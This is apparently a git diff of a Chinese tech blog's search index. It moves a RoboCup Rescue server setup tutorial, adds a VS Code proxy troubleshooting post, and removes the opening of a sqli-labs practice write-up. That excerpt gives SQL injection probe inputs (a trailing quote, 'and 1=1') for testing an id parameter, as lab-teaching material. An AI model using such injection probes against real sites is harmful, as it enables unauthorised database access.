@@ -110,158 +110,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ROBOCUP RESCUE 示例代码演示</title>
-    <url>/2022/03/20/Apollo/</url>
-    <content><![CDATA[<p>用于记录给学弟学妹们讲解简单的运行服务器和挂载智能体的知识</p>
-<h3 id="一、VMware的安装"><a href="#一、VMware的安装" class="headerlink" title="一、VMware的安装"></a>一、VMware的安装</h3><p>方法一：去官网下载，然后去网上找相关的许可证</p>
-<p>方法二：<a href="http://mp.weixin.qq.com/s?__biz=MzIyNjU2NzIxNQ==&amp;mid=2247485198&amp;idx=1&amp;sn=fb2461b340e6dd31895d0993ad72e4c4&amp;chksm=e86f324edf18bb58d6f0f7cbd9d30caef8f2b6899a12f9303f9c83cc961f7900058373a1f36e&amp;mpshare=1&amp;scene=23&amp;srcid=0222CQ5598w1CNpqZW61vgzL&amp;sharer_sharetime=1645512785274&amp;sharer_shareid=d91c96e983bc83094af7577cae27fc84#rd">http://mp.weixin.qq.com/s?__biz=MzIyNjU2NzIxNQ==&amp;mid=2247485198&amp;idx=1&amp;sn=fb2461b340e6dd31895d0993ad72e4c4&amp;chksm=e86f324edf18bb58d6f0f7cbd9d30caef8f2b6899a12f9303f9c83cc961f7900058373a1f36e&amp;mpshare=1&amp;scene=23&amp;srcid=0222CQ5598w1CNpqZW61vgzL&amp;sharer_sharetime=1645512785274&amp;sharer_shareid=d91c96e983bc83094af7577cae27fc84#rd</a></p>
-<p>（微信公众号里的资源）</p>
-<h3 id="二、Ubuntu的安装"><a href="#二、Ubuntu的安装" class="headerlink" title="二、Ubuntu的安装"></a>二、Ubuntu的安装</h3><blockquote>
-<p>建议直接使用我发在群里的迅雷链接下，那样会快很多。</p>
-</blockquote>
-<p>下面两个方法只是给出作为参考，不建议使用，如果使用记得看好版本，下载<strong>Ubuntu18.04</strong>.</p>
-<p>方法一：Ubuntu官网：</p>
-<p><a href="https://cn.ubuntu.com/?_ga=2.176887340.845118543.1645454480-1361094071.1630542545">企业开源和Linux | Ubuntu</a>（中文站）</p>
-<img src="/2022/03/20/Apollo/image-20220222144723106.png" alt="image-20220222144723106" style="zoom:33%;">
-
-<blockquote>
-<p>切记选择桌面系统，不要去选服务器版，服务器版没有图形界面</p>
-</blockquote>
-<p>方法二：清华镜像源</p>
-<p><a href="https://mirrors.tuna.tsinghua.edu.cn/#">清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p>
-<img src="/2022/03/20/Apollo/image-20220222144944607.png" alt="image-20220222144944607" style="zoom:33%;">
-
-<img src="/2022/03/20/Apollo/image-20220222145131330.png" alt="image-20220222145131330" style="zoom: 33%;">
-
-<h3 id="三、Ubuntu虚拟机的创建"><a href="#三、Ubuntu虚拟机的创建" class="headerlink" title="三、Ubuntu虚拟机的创建"></a>三、Ubuntu虚拟机的创建</h3><p>相关的教程网上有许多，可相互参考着来，找了几篇供大家参考(18.04与20.04的安装过程差不多，也可以作为参考)</p>
-<p><a href="https://www.jb51.net/article/187313.htm">VMware15虚拟机安装Ubuntu18.04的图文教程_VMware_脚本之家 (jb51.net)</a></p>
-<p><a href="https://zhuanlan.zhihu.com/p/355314438">史上最全最新Ubuntu20.04安装教程（图文） - 知乎 (zhihu.com)</a></p>
-<p><a href="https://www.cnblogs.com/ubuntuanzhuang/p/12934044.html">ubuntu20.04安装教程,ubuntu详细安装教程20.04 - ubuntu安装配置教程 - 博客园 (cnblogs.com)</a></p>
-<p><strong>【注意】</strong>:<font color="red">考虑到以后运行服务器时的速度，建议在安装时将内存尽量选大一点，电脑允许的话选择4096MB或者更高吧。磁盘大小的话选择40G或者更大。</font></p>
-<img src="/2022/03/20/Apollo/image-20220318203527795-16512372663262.png" alt="image-20220318203527795" style="zoom: 50%;">
-
-<img src="/2022/03/20/Apollo/image-20220318203601453-16512372663261.png" alt="image-20220318203601453" style="zoom: 50%;">
-
-<p>安装完成后进入Ubuntu（我这里演示用的是Ubuntu２１，所以界面看起来可能不太一样）</p>
-<img src="/2022/03/20/Apollo/image-20220222150520871.png" alt="image-20220222150520871" style="zoom:33%;">
-
-<blockquote>
-<p>为了操作便捷，建议再安装一下vmware tools，可以参考下面那个链接中的方式安装，也可以自己百度一些其他的博客。关于如何知道是否安装成功vmware tools，可以尝试将自己主机中的一个txt文档拖拽进 Ubuntu中（拖进某个文件夹，直接拖到桌面好像不行），如果可以的话说明vmware tools已经安装好了。</p>
-</blockquote>
-<p><a href="https://www.cnblogs.com/VagueCheung/p/13535687.html">VMware虚拟机安装Ubuntu18.04教程（图文） - VagueCheung - 博客园 (cnblogs.com)</a></p>
-<h3 id="四、配置相关环境"><a href="#四、配置相关环境" class="headerlink" title="四、配置相关环境"></a>四、配置相关环境</h3><h4 id="JDK的安装"><a href="#JDK的安装" class="headerlink" title="JDK的安装"></a>JDK的安装</h4><p>桌面右键，选择打开终端，使用命令<code>sudo apt install openjdk-17-jdk</code>安装JDK１７</p>
-<img src="/2022/03/20/Apollo/image-20220318204516525-16512372663263.png" alt="image-20220318204516525" style="zoom: 67%;">
-
-<blockquote>
-<p>如果这里下载的速度很慢，只有十几kb/s，那么建议<strong>换源</strong></p>
-<p>一篇讲的很清楚的换源教程：</p>
-<p><a href="https://blog.csdn.net/wangyijieonline/article/details/105360138">Linux]Ubuntu 20.04换阿里源_wangyijieonline的博客-CSDN博客_ubuntu 阿里源</a></p>
-</blockquote>
-<p>在安装完成后再次输入 <code>java -version</code> 和 <code>javac -version</code>，出现相应的版本号即安装成功</p>
-<img src="/2022/03/20/Apollo/image-20220318204617743-16512372663264.png" alt="image-20220318204617743" style="zoom:67%;">
-
-<h4 id="Git与Gradle的安装："><a href="#Git与Gradle的安装：" class="headerlink" title="Git与Gradle的安装："></a>Git与Gradle的安装：</h4><p>在终端输入 <code>gradle -version</code>尝试查看gradle版本，未安装的情况下会提示命令找不到，然后会提示你相关的安装命令（类似这种 <code>sudo apt-get install gradle</code> ），复制下来回车安装即可（因为我在演示前已经安装了，此处直接显示的就是gradle版本号了，你们按照提示安装即可）。</p>
-<p>git的安装与gradle类似，都是先尝试查看版本号，然后根据提示安装。</p>
-<img src="/2022/03/20/Apollo/image-20220318212528084-16512372663265.png" alt="image-20220318212528084" style="zoom: 67%;">
-
-<h3 id="五、服务器的运行"><a href="#五、服务器的运行" class="headerlink" title="五、服务器的运行"></a>五、服务器的运行</h3><h4 id="1-下载压缩包"><a href="#1-下载压缩包" class="headerlink" title="1.下载压缩包"></a>1.下载压缩包</h4><p>在Home目录下（或者其他位置）新建一个文件夹Apollo，然后将服务器和示例代码压缩包复制进来，压缩包没有的可以去下面这个链接自取</p>
-<p>链接：<a href="https://pan.baidu.com/s/1t3EGlevX4M1cCRkLurDDRA">https://pan.baidu.com/s/1t3EGlevX4M1cCRkLurDDRA</a><br>提取码：rcrs</p>
-<img src="/2022/03/20/Apollo/image-20220318205716154-16512372663266.png" alt="image-20220318205716154" style="zoom:67%;">
-
-<p>可以先下载到windows主机，然后将整个压缩包复制到虚拟机中。</p>
-<p>然后右键“提取到此处”进行解压缩</p>
-<img src="/2022/03/20/Apollo/image-20220318210150116-16512372663267.png" alt="image-20220318210150116" style="zoom:67%;">
-
-<p>继续将里面的两个压缩包解压缩，得到如下两个文件夹。</p>
-<img src="/2022/03/20/Apollo/image-20220318210259946-16512372663268.png" alt="image-20220318210259946" style="zoom:67%;">
-
-<h4 id="2-服务器的运行"><a href="#2-服务器的运行" class="headerlink" title="2.服务器的运行"></a>2.服务器的运行</h4><p>首先进入rcrs-server-master文件夹，右键打开终端，输入指令进行编译：</p>
-<pre><code>./gradlew completeBuild
-</code></pre>
-<img src="/2022/03/20/Apollo/image-20220318210442941-16512372663279.png" alt="image-20220318210442941" style="zoom: 50%;">
-
-<p>编译成功后终端会显示 BUILD SUCESSFULLY</p>
-<img src="/2022/03/20/Apollo/image-20220318210624211-165123726632710.png" alt="image-20220318210624211" style="zoom:50%;">
-
-<p>接着输入以下指令来进入scripts文件夹：(cd是进入某个文件夹的命令，可以自己去了解了解<strong>Linux常用命令</strong>)</p>
-<pre><code>cd scripts
-</code></pre>
-<p>然后使用以下指令启动服务器：</p>
-<pre><code>bash start.sh -m ../maps/test/map -c ../maps/test/config
-</code></pre>
-<blockquote>
-<p>start.sh是一个用来启动的脚本，bash是执行这个脚本的命令</p>
-<p><strong>-m</strong> 用来指定地图  ..是指的父目录（上一级目录，即rcrs-server-master文件夹，因为前面用 cd scripts命令进入了该目录下的scripts文件夹） ../maps/test/map 指的就是上一级目录中的maps、test/map,大家可以自己在文件夹里点进去看看，确实存在的</p>
-<p><strong>-c</strong> 用来指定地图配置文件 ../maps/test/config 大家也可以自己去找一下看看，也确实存在</p>
-</blockquote>
-<img src="/2022/03/20/Apollo/image-20220318210755610-165123726632711.png" alt="image-20220318210755610" style="zoom:50%;">
-
-<p>命令执行后等待一会儿服务器就会成功启动，如下图所示：</p>
-<img src="/2022/03/20/Apollo/image-20220318210936867-165123726632712.png" alt="image-20220318210936867" style="zoom:50%;">
-
-
-
-<h4 id="3-智能体的挂载"><a href="#3-智能体的挂载" class="headerlink" title="3.智能体的挂载"></a>3.智能体的挂载</h4><p>服务器启动成功后就要把相关的智能体挂载上去，可以理解为把我们写好的代码连接上服务器，让它能够去控制智能体的行动。</p>
-<p>首先不要关闭之前的终端，也不要关闭服务器。Ctrl+D回到桌面，进入之前解压缩好的adf-sample-agent-java文件夹，然后右键进入终端，输入以下命令：</p>
-<pre><code>./gradlew clean
-</code></pre>
-<pre><code>./gradlew build
-</code></pre>
-<p>然后就会对代码进行编译，编译成功后的界面如下图所示：</p>
-<img src="/2022/03/20/Apollo/image-20220318211123118-165123726632714.png" alt="image-20220318211123118" style="zoom:50%;">
-
-<p>然后使用以下命令挂载智能体：</p>
-<pre><code>bash launch.sh -all
-</code></pre>
-<img src="/2022/03/20/Apollo/image-20220318211226261-165123726632713.png" alt="image-20220318211226261" style="zoom: 67%;">
-
-<p>终端会显示成功挂载的智能体数量，如下图所示则为挂载成功：</p>
-<img src="/2022/03/20/Apollo/image-20220318211409355-165123726632717.png" alt="image-20220318211409355" style="zoom: 67%;">
-
-<p>进度条会一直卡在75%，这时去之前开启的服务器，可以直接点击左侧的图标，进到服务器后直接点Run，然后就能开始跑图。</p>
-<img src="/2022/03/20/Apollo/image-20220318211530508-165123726632716.png" alt="image-20220318211530508" style="zoom: 50%;">
-
-<p>如下图所示，Time指的是回合数，Score指的是分数。</p>
-<img src="/2022/03/20/Apollo/image-20220318211704356-165123726632715.png" alt="image-20220318211704356" style="zoom: 67%;">
-
-<p>运行后的两个终端状况如下图所示</p>
-<img src="/2022/03/20/Apollo/image-20220318211754595-165123726632718.png" alt="image-20220318211754595" style="zoom:50%;">
-
-<p>等到图跑结束后进到服务器那个终端，按<code>Ctrl+C</code>结束运行，并执行 <code>bash kill.sh</code> 彻底杀死进程。</p>
-<img src="/2022/03/20/Apollo/image-20220318211856078-165123726632719.png" alt="image-20220318211856078" style="zoom:67%;">
-
-<p>然后在adf-sample-agent-java文件夹中用Ctrl+C结束智能体的挂载，结束后的两个终端如下图所示：</p>
-<img src="/2022/03/20/Apollo/image-20220318211925792-165123726632720.png" alt="image-20220318211925792" style="zoom:67%;">
-
-<p>到此结束！</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <categories>
-        <category>技术学习</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CTFShow刷题小结(信息搜集)</title>
     <url>/2020/10/15/CTFShow%E5%88%B7%E9%A2%98%E5%B0%8F%E7%BB%93(%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86)/</url>
     <content><![CDATA[<p>划了好久的水了，恰巧最近空余时间还算多，就开始刷CTFshow 上的web入门</p>
@@ -490,6 +338,158 @@ http://url/CVS/Entries 返回所有文件的结构
       </tags>
   </entry>
   <entry>
+    <title>ROBOCUP RESCUE 示例代码演示</title>
+    <url>/2022/03/20/Apollo/</url>
+    <content><![CDATA[<p>用于记录给学弟学妹们讲解简单的运行服务器和挂载智能体的知识</p>
+<h3 id="一、VMware的安装"><a href="#一、VMware的安装" class="headerlink" title="一、VMware的安装"></a>一、VMware的安装</h3><p>方法一：去官网下载，然后去网上找相关的许可证</p>
+<p>方法二：<a href="http://mp.weixin.qq.com/s?__biz=MzIyNjU2NzIxNQ==&amp;mid=2247485198&amp;idx=1&amp;sn=fb2461b340e6dd31895d0993ad72e4c4&amp;chksm=e86f324edf18bb58d6f0f7cbd9d30caef8f2b6899a12f9303f9c83cc961f7900058373a1f36e&amp;mpshare=1&amp;scene=23&amp;srcid=0222CQ5598w1CNpqZW61vgzL&amp;sharer_sharetime=1645512785274&amp;sharer_shareid=d91c96e983bc83094af7577cae27fc84#rd">http://mp.weixin.qq.com/s?__biz=MzIyNjU2NzIxNQ==&amp;mid=2247485198&amp;idx=1&amp;sn=fb2461b340e6dd31895d0993ad72e4c4&amp;chksm=e86f324edf18bb58d6f0f7cbd9d30caef8f2b6899a12f9303f9c83cc961f7900058373a1f36e&amp;mpshare=1&amp;scene=23&amp;srcid=0222CQ5598w1CNpqZW61vgzL&amp;sharer_sharetime=1645512785274&amp;sharer_shareid=d91c96e983bc83094af7577cae27fc84#rd</a></p>
+<p>（微信公众号里的资源）</p>
+<h3 id="二、Ubuntu的安装"><a href="#二、Ubuntu的安装" class="headerlink" title="二、Ubuntu的安装"></a>二、Ubuntu的安装</h3><blockquote>
+<p>建议直接使用我发在群里的迅雷链接下，那样会快很多。</p>
+</blockquote>
+<p>下面两个方法只是给出作为参考，不建议使用，如果使用记得看好版本，下载<strong>Ubuntu18.04</strong>.</p>
+<p>方法一：Ubuntu官网：</p>
+<p><a href="https://cn.ubuntu.com/?_ga=2.176887340.845118543.1645454480-1361094071.1630542545">企业开源和Linux | Ubuntu</a>（中文站）</p>
+<img src="/2022/03/20/Apollo/image-20220222144723106.png" alt="image-20220222144723106" style="zoom:33%;">
+
+<blockquote>
+<p>切记选择桌面系统，不要去选服务器版，服务器版没有图形界面</p>
+</blockquote>
+<p>方法二：清华镜像源</p>
+<p><a href="https://mirrors.tuna.tsinghua.edu.cn/#">清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p>
+<img src="/2022/03/20/Apollo/image-20220222144944607.png" alt="image-20220222144944607" style="zoom:33%;">
+
+<img src="/2022/03/20/Apollo/image-20220222145131330.png" alt="image-20220222145131330" style="zoom: 33%;">
+
+<h3 id="三、Ubuntu虚拟机的创建"><a href="#三、Ubuntu虚拟机的创建" class="headerlink" title="三、Ubuntu虚拟机的创建"></a>三、Ubuntu虚拟机的创建</h3><p>相关的教程网上有许多，可相互参考着来，找了几篇供大家参考(18.04与20.04的安装过程差不多，也可以作为参考)</p>
+<p><a href="https://www.jb51.net/article/187313.htm">VMware15虚拟机安装Ubuntu18.04的图文教程_VMware_脚本之家 (jb51.net)</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/355314438">史上最全最新Ubuntu20.04安装教程（图文） - 知乎 (zhihu.com)</a></p>
+<p><a href="https://www.cnblogs.com/ubuntuanzhuang/p/12934044.html">ubuntu20.04安装教程,ubuntu详细安装教程20.04 - ubuntu安装配置教程 - 博客园 (cnblogs.com)</a></p>
+<p><strong>【注意】</strong>:<font color="red">考虑到以后运行服务器时的速度，建议在安装时将内存尽量选大一点，电脑允许的话选择4096MB或者更高吧。磁盘大小的话选择40G或者更大。</font></p>
+<img src="/2022/03/20/Apollo/image-20220318203527795-16512372663262.png" alt="image-20220318203527795" style="zoom: 50%;">
+
+<img src="/2022/03/20/Apollo/image-20220318203601453-16512372663261.png" alt="image-20220318203601453" style="zoom: 50%;">
+
+<p>安装完成后进入Ubuntu（我这里演示用的是Ubuntu２１，所以界面看起来可能不太一样）</p>
+<img src="/2022/03/20/Apollo/image-20220222150520871.png" alt="image-20220222150520871" style="zoom:33%;">
+
+<blockquote>
+<p>为了操作便捷，建议再安装一下vmware tools，可以参考下面那个链接中的方式安装，也可以自己百度一些其他的博客。关于如何知道是否安装成功vmware tools，可以尝试将自己主机中的一个txt文档拖拽进 Ubuntu中（拖进某个文件夹，直接拖到桌面好像不行），如果可以的话说明vmware tools已经安装好了。</p>
+</blockquote>
+<p><a href="https://www.cnblogs.com/VagueCheung/p/13535687.html">VMware虚拟机安装Ubuntu18.04教程（图文） - VagueCheung - 博客园 (cnblogs.com)</a></p>
+<h3 id="四、配置相关环境"><a href="#四、配置相关环境" class="headerlink" title="四、配置相关环境"></a>四、配置相关环境</h3><h4 id="JDK的安装"><a href="#JDK的安装" class="headerlink" title="JDK的安装"></a>JDK的安装</h4><p>桌面右键，选择打开终端，使用命令<code>sudo apt install openjdk-17-jdk</code>安装JDK１７</p>
+<img src="/2022/03/20/Apollo/image-20220318204516525-16512372663263.png" alt="image-20220318204516525" style="zoom: 67%;">
+
+<blockquote>
+<p>如果这里下载的速度很慢，只有十几kb/s，那么建议<strong>换源</strong></p>
+<p>一篇讲的很清楚的换源教程：</p>
+<p><a href="https://blog.csdn.net/wangyijieonline/article/details/105360138">Linux]Ubuntu 20.04换阿里源_wangyijieonline的博客-CSDN博客_ubuntu 阿里源</a></p>
+</blockquote>
+<p>在安装完成后再次输入 <code>java -version</code> 和 <code>javac -version</code>，出现相应的版本号即安装成功</p>
+<img src="/2022/03/20/Apollo/image-20220318204617743-16512372663264.png" alt="image-20220318204617743" style="zoom:67%;">
+
+<h4 id="Git与Gradle的安装："><a href="#Git与Gradle的安装：" class="headerlink" title="Git与Gradle的安装："></a>Git与Gradle的安装：</h4><p>在终端输入 <code>gradle -version</code>尝试查看gradle版本，未安装的情况下会提示命令找不到，然后会提示你相关的安装命令（类似这种 <code>sudo apt-get install gradle</code> ），复制下来回车安装即可（因为我在演示前已经安装了，此处直接显示的就是gradle版本号了，你们按照提示安装即可）。</p>
+<p>git的安装与gradle类似，都是先尝试查看版本号，然后根据提示安装。</p>
+<img src="/2022/03/20/Apollo/image-20220318212528084-16512372663265.png" alt="image-20220318212528084" style="zoom: 67%;">
+
+<h3 id="五、服务器的运行"><a href="#五、服务器的运行" class="headerlink" title="五、服务器的运行"></a>五、服务器的运行</h3><h4 id="1-下载压缩包"><a href="#1-下载压缩包" class="headerlink" title="1.下载压缩包"></a>1.下载压缩包</h4><p>在Home目录下（或者其他位置）新建一个文件夹Apollo，然后将服务器和示例代码压缩包复制进来，压缩包没有的可以去下面这个链接自取</p>
+<p>链接：<a href="https://pan.baidu.com/s/1t3EGlevX4M1cCRkLurDDRA">https://pan.baidu.com/s/1t3EGlevX4M1cCRkLurDDRA</a><br>提取码：rcrs</p>
+<img src="/2022/03/20/Apollo/image-20220318205716154-16512372663266.png" alt="image-20220318205716154" style="zoom:67%;">
+
+<p>可以先下载到windows主机，然后将整个压缩包复制到虚拟机中。</p>
+<p>然后右键“提取到此处”进行解压缩</p>
+<img src="/2022/03/20/Apollo/image-20220318210150116-16512372663267.png" alt="image-20220318210150116" style="zoom:67%;">
+
+<p>继续将里面的两个压缩包解压缩，得到如下两个文件夹。</p>
+<img src="/2022/03/20/Apollo/image-20220318210259946-16512372663268.png" alt="image-20220318210259946" style="zoom:67%;">
+
+<h4 id="2-服务器的运行"><a href="#2-服务器的运行" class="headerlink" title="2.服务器的运行"></a>2.服务器的运行</h4><p>首先进入rcrs-server-master文件夹，右键打开终端，输入指令进行编译：</p>
+<pre><code>./gradlew completeBuild
+</code></pre>
+<img src="/2022/03/20/Apollo/image-20220318210442941-16512372663279.png" alt="image-20220318210442941" style="zoom: 50%;">
+
+<p>编译成功后终端会显示 BUILD SUCESSFULLY</p>
+<img src="/2022/03/20/Apollo/image-20220318210624211-165123726632710.png" alt="image-20220318210624211" style="zoom:50%;">
+
+<p>接着输入以下指令来进入scripts文件夹：(cd是进入某个文件夹的命令，可以自己去了解了解<strong>Linux常用命令</strong>)</p>
+<pre><code>cd scripts
+</code></pre>
+<p>然后使用以下指令启动服务器：</p>
+<pre><code>bash start.sh -m ../maps/test/map -c ../maps/test/config
+</code></pre>
+<blockquote>
+<p>start.sh是一个用来启动的脚本，bash是执行这个脚本的命令</p>
+<p><strong>-m</strong> 用来指定地图  ..是指的父目录（上一级目录，即rcrs-server-master文件夹，因为前面用 cd scripts命令进入了该目录下的scripts文件夹） ../maps/test/map 指的就是上一级目录中的maps、test/map,大家可以自己在文件夹里点进去看看，确实存在的</p>
+<p><strong>-c</strong> 用来指定地图配置文件 ../maps/test/config 大家也可以自己去找一下看看，也确实存在</p>
+</blockquote>
+<img src="/2022/03/20/Apollo/image-20220318210755610-165123726632711.png" alt="image-20220318210755610" style="zoom:50%;">
+
+<p>命令执行后等待一会儿服务器就会成功启动，如下图所示：</p>
+<img src="/2022/03/20/Apollo/image-20220318210936867-165123726632712.png" alt="image-20220318210936867" style="zoom:50%;">
+
+
+
+<h4 id="3-智能体的挂载"><a href="#3-智能体的挂载" class="headerlink" title="3.智能体的挂载"></a>3.智能体的挂载</h4><p>服务器启动成功后就要把相关的智能体挂载上去，可以理解为把我们写好的代码连接上服务器，让它能够去控制智能体的行动。</p>
+<p>首先不要关闭之前的终端，也不要关闭服务器。Ctrl+D回到桌面，进入之前解压缩好的adf-sample-agent-java文件夹，然后右键进入终端，输入以下命令：</p>
+<pre><code>./gradlew clean
+</code></pre>
+<pre><code>./gradlew build
+</code></pre>
+<p>然后就会对代码进行编译，编译成功后的界面如下图所示：</p>
+<img src="/2022/03/20/Apollo/image-20220318211123118-165123726632714.png" alt="image-20220318211123118" style="zoom:50%;">
+
+<p>然后使用以下命令挂载智能体：</p>
+<pre><code>bash launch.sh -all
+</code></pre>
+<img src="/2022/03/20/Apollo/image-20220318211226261-165123726632713.png" alt="image-20220318211226261" style="zoom: 67%;">
+
+<p>终端会显示成功挂载的智能体数量，如下图所示则为挂载成功：</p>
+<img src="/2022/03/20/Apollo/image-20220318211409355-165123726632717.png" alt="image-20220318211409355" style="zoom: 67%;">
+
+<p>进度条会一直卡在75%，这时去之前开启的服务器，可以直接点击左侧的图标，进到服务器后直接点Run，然后就能开始跑图。</p>
+<img src="/2022/03/20/Apollo/image-20220318211530508-165123726632716.png" alt="image-20220318211530508" style="zoom: 50%;">
+
+<p>如下图所示，Time指的是回合数，Score指的是分数。</p>
+<img src="/2022/03/20/Apollo/image-20220318211704356-165123726632715.png" alt="image-20220318211704356" style="zoom: 67%;">
+
+<p>运行后的两个终端状况如下图所示</p>
+<img src="/2022/03/20/Apollo/image-20220318211754595-165123726632718.png" alt="image-20220318211754595" style="zoom:50%;">
+
+<p>等到图跑结束后进到服务器那个终端，按<code>Ctrl+C</code>结束运行，并执行 <code>bash kill.sh</code> 彻底杀死进程。</p>
+<img src="/2022/03/20/Apollo/image-20220318211856078-165123726632719.png" alt="image-20220318211856078" style="zoom:67%;">
+
+<p>然后在adf-sample-agent-java文件夹中用Ctrl+C结束智能体的挂载，结束后的两个终端如下图所示：</p>
+<img src="/2022/03/20/Apollo/image-20220318211925792-165123726632720.png" alt="image-20220318211925792" style="zoom:67%;">
+
+<p>到此结束！</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>技术学习</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>数据结构疑问</title>
     <url>/2021/03/16/DSQuestion/</url>
     <content><![CDATA[<p>记录《数据结构》中的一些问题</p>
@@ -583,6 +583,59 @@ http://url/CVS/Entries 返回所有文件的结构
       </tags>
   </entry>
   <entry>
+    <title>Vscode_Error</title>
+    <url>/2023/08/06/Vscode-Error/</url>
+    <content><![CDATA[<h3 id="一、问题概述"><a href="#一、问题概述" class="headerlink" title="一、问题概述"></a>一、问题概述</h3><blockquote>
+<p>vscode 获取扩展失败，XHR failed</p>
+</blockquote>
+<p>平时vscode只是用来跑一跑C/C++代码，最近想装一个插件的时候在插件商店搜索的时候却报错XHR failed，然后在网上查了查，似乎是连不上网，可能是代理出了问题。这才想起来似乎vscode好久没有给我推过版本更新或者推荐插件什么的了，可能是无法联网的原因。</p>
+<h3 id="二、解决方法"><a href="#二、解决方法" class="headerlink" title="二、解决方法"></a>二、解决方法</h3><p>网上的解决方法是修改vscode里的设置，将代理移除，但是我按照这种方法并不奏效。</p>
+<p><a href="https://blog.csdn.net/SUDA196/article/details/127104495">Win10解决vscode获取扩展失败，XHR failed（亲测可以解决）_苏打不会碱的博客-CSDN博客</a></p>
+<p>后来在查找解决方法的时候偶然发现了这篇文章：</p>
+<p><a href="https://www.cnblogs.com/joyzen/p/13815384.html">VS Code代理设置错误 - 许你一世煙花 - 博客园 (cnblogs.com)</a></p>
+<p>里面提到：</p>
+<blockquote>
+<p>VS Code会去读取系统变量HTTP_PROXY的值设置为代理地址，去查了下系统环境变量设置里面果真有这个变量，删除后即可解决VS Code商店连不上的问题</p>
+</blockquote>
+<p>按照他的方法我确实在电脑上找到了HTTP＿PROXY（我的是小写）这个系统变量，并且它的值是127.0.0.1:32100(可能是这样，删的果断了点没太记住)。按道理来说我的代理的端口是7890，显然他这里的端口值不太对，我没有去修改而是直接删除了这个变量。</p>
+<p>删除后我尝试重启vscode，试了下发现还是连不上网，发现是因为我的vscode设置中设置了代理<code>http://127.0.0.1:7890</code>，但是我此时并没有开启代理，将代理开启后就可以正常联网了。</p>
+<p><img src="https://aband0n.oss-cn-nanjing.aliyuncs.com/img/image-20230806154211788.png" alt="image-20230806154211788"></p>
+<p>当然，如果不想开代理的话就将上面的<code>http://127.0.0.1:7890</code>删除，这样不开代理的情况下也可以正常联网。</p>
+<h3 id="三、意外收获"><a href="#三、意外收获" class="headerlink" title="三、意外收获"></a>三、意外收获</h3><p>上面那篇文章中还提到了一点：</p>
+<blockquote>
+<p>同时还发现HTTP_PROXY这个环境变量还被被其他软件环境读取作为代理地址，比如yarn，造成依赖下载被代理到指定地址导致失败。</p>
+</blockquote>
+<p>其他软件也会读取HTTP_PROXY这个环境变量作为代理地址，突然想起之前自己电脑在使用群晖chat（Synology chat）的时候客户端一直无法正常登录，但是使用虚拟机或者其他人的电脑就可以正常登录，很奇怪，当时怀疑是自己电脑某个端口或者设置导致的，但是在网上搜索了很久都没有找到解决方案，一直搁置，使用的网页版。</p>
+<p>所以我突然想到会不会当时无法登录也是因为这个环境变量呢？抱着试一试的心态打开客户端登录了一下，发现居然登陆成功了！害人不浅啊这个环境变量！<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8">😭</span></p>
+<p>所以如果你有某些软件一直登录不成功，不妨也检查一下自己的环境变量。</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>报错处理</category>
+      </categories>
+      <tags>
+        <tag>Vscode</tag>
+        <tag>Synology</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>YCBCTF wp</title>
     <url>/2020/09/10/YCBCTF/</url>
     <content><![CDATA[<p>“羊城杯”，开学后打的一场比赛，由于我实在是太菜了，只会写第一题<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8">😭</span></p>
@@ -658,154 +711,6 @@ http://url/CVS/Entries 返回所有文件的结构
       </categories>
       <tags>
         <tag>hexo 代码高亮 matery</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs-master 刷题记录</title>
-    <url>/2020/10/18/sqlilab/</url>
-    <content><![CDATA[<h3 id="注入的分类"><a href="#注入的分类" class="headerlink" title="注入的分类"></a>注入的分类</h3><p>注入的分类：数字型和字符型。攻击者目的只有一点，那就是绕过程序的限制，使用户输入的数据带入数据库执行，利用数据库的特殊性获取更多的信息或者更大的权限。</p>
-<h4 id="1、数字型注入"><a href="#1、数字型注入" class="headerlink" title="1、数字型注入"></a>1、数字型注入</h4><p>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</p>
-<p>测试步骤：</p>
-<p>（1） 加单引号，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a>’</p>
-<p>对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p>
-<p>（2） 加and 1=1 ,URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1=1</p>
